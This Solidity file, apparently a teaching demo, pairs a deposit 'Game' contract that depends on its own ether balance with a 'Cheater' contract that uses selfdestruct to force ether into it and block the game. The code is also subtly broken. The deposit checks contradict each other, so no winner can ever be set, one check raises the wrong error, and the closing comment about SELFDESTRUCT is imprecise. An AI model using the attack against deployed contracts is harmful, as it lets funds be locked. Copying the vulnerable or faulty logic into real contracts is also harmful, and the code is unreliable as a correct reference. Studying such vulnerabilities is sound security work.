// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// the following is more of a DoS attack, but it leverages a forced ether transfer using selfdestruct
contract Game {
    uint constant GOAL = 100 ether;
    uint constant MAX_CONTRIBUTION = 1 ether;
    address public winner;

    error Game__GoalExceeded();
    error Game__AmountTooBig();
    error Game__GoalNotReached();
    error Game__NotWinner();
    error Game__TransferFailed();

    function deposit() public payable {
        require(msg.value <= MAX_CONTRIBUTION, Game__GoalExceeded());
        require(address(this).balance < GOAL, Game__GoalExceeded());

        if (address(this).balance == GOAL) {
            winner = msg.sender;
        }
    }

    function claimReward() public payable {
        require(address(this).balance == GOAL, Game__GoalNotReached());
        require(winner == msg.sender, Game__NotWinner());

        (bool sent, ) = msg.sender.call{ value: address(this).balance }("");
        require(sent, Game__TransferFailed());
    }

    function getWinner() public view returns (address) {
        return winner;
    }
}

contract Cheater {
    function boom(address payable _receiver) public payable {
        selfdestruct(_receiver);
        // note: since 0.8.18, the SELFDESTRUCT opcode no longer deletes the code and data associated to an account
    }
}
